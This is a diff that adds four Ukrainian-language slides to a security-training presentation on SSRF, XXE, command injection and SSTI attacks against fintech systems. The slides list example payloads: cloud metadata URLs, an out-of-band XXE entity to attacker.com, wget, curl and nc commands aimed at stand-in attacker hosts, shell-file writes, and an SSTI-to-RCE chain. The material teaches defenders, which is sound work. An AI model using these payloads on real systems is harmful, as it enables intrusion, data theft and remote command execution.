@@ -204,7 +204,127 @@
       </div>
     </section>
 
-    <!-- 8. Підсумок -->
+    <!-- 8. SSRF сценарії атак -->
+    <section class="slide">
+      <h1>SSRF: сценарії атак</h1>
+      <h2>Хмарні та внутрішні вектори</h2>
+      <div class="card-grid">
+        <div class="card accent-red">
+          <span class="card-icon">☁️</span>
+          <div class="card-title">Cloud Metadata</div>
+          <div class="card-text">AWS: 169.254.169.254/latest/meta-data/iam/<br>GCP: metadata.google.internal<br>Azure: 169.254.169.254/metadata</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">🗄️</span>
+          <div class="card-title">Внутрішні сервіси</div>
+          <div class="card-text">Redis: dict://localhost:6379<br>Elasticsearch: http://localhost:9200<br>Consul/etcd: конфігурації та секрети</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">🔧</span>
+          <div class="card-title">Адмін-панелі</div>
+          <div class="card-text">Kubernetes Dashboard<br>Jenkins: http://internal:8080<br>Grafana, phpMyAdmin без auth</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">📂</span>
+          <div class="card-title">Файлові протоколи</div>
+          <div class="card-text">file:///etc/passwd<br>gopher:// для складних запитів<br>ftp:// для внутрішніх файлів</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>SSRF у фінтех: доступ до внутрішнього API платежів → ініціювання переказів без автентифікації.</p>
+      </div>
+    </section>
+
+    <!-- 9. XXE payload приклади -->
+    <section class="slide">
+      <h1>XXE: приклади payload</h1>
+      <h2>Типові атаки через XML-парсер</h2>
+      <div class="icon-list">
+        <div class="icon-list-item">
+          <span class="il-icon">📄</span>
+          <span class="il-text"><strong>File Read:</strong> &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; → читання системних файлів</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">🌐</span>
+          <span class="il-text"><strong>SSRF через XXE:</strong> &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/..."&gt; → cloud metadata</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">💥</span>
+          <span class="il-text"><strong>Billion Laughs:</strong> рекурсивне розгортання сутностей → DoS, пам'ять сервера вичерпується</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">📤</span>
+          <span class="il-text"><strong>Blind XXE:</strong> дані через OOB — &lt;!ENTITY % xxe SYSTEM "http://attacker.com/?d=..."&gt;</span>
+        </div>
+      </div>
+      <div class="highlight-box warning" style="margin-top: 1.2rem;">
+        <p>FinTech контекст: SWIFT MT/MX повідомлення, ISO 20022, SOAP-інтеграції — всі використовують XML і вразливі до XXE.</p>
+      </div>
+    </section>
+
+    <!-- 10. Command Injection патерни -->
+    <section class="slide">
+      <h1>Command Injection: патерни</h1>
+      <h2>Як зловмисники впроваджують команди ОС</h2>
+      <div class="card-grid">
+        <div class="card accent-red">
+          <span class="card-icon">⛓️</span>
+          <div class="card-title">Ланцюжок команд</div>
+          <div class="card-text">; cat /etc/passwd<br>&& wget attacker.com/shell<br>|| curl evil.com/exfil</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">🔄</span>
+          <div class="card-title">Підстановка</div>
+          <div class="card-text">$(whoami)<br>`id`<br>$((2+2)) — арифметична підстановка</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">📝</span>
+          <div class="card-title">Pipe та redirect</div>
+          <div class="card-text">| nc attacker.com 4444<br>> /var/www/shell.php<br>>> /etc/crontab</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">🛡️</span>
+          <div class="card-title">Захист</div>
+          <div class="card-text">Бібліотечні API (не CLI)<br>Whitelist аргументів<br>Sandbox / контейнери</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Генерація PDF-виписок, конвертація документів, обробка зображень — типові точки входу Command Injection у фінтех.</p>
+      </div>
+    </section>
+
+    <!-- 11. SSTI у шаблонізаторах -->
+    <section class="slide">
+      <h1>SSTI: атаки на шаблонізатори</h1>
+      <h2>Від ін'єкції в шаблон до RCE</h2>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-title">Виявлення</div>
+          <div class="step-desc">Введення {{7*7}} → якщо відповідь 49, шаблонізатор вразливий</div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-title">Ідентифікація</div>
+          <div class="step-desc">{{7*'7'}} → Jinja2: 7777777, Twig: 49 — визначаємо движок</div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-title">Ескалація</div>
+          <div class="step-desc">Доступ до внутрішніх об'єктів: __class__, __globals__, __builtins__</div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-title">RCE</div>
+          <div class="step-desc">os.popen('cat /etc/passwd').read() — повне виконання команд</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Фінтех: email "Шановний {{user.name}}" → якщо user.name = {{payload}}, сервер виконає довільний код.</p>
+      </div>
+    </section>
+
+    <!-- 12. Підсумок -->
     <section class="slide">
       <span class="slide-icon">🛡️</span>
       <h1>Ключові висновки</h1>
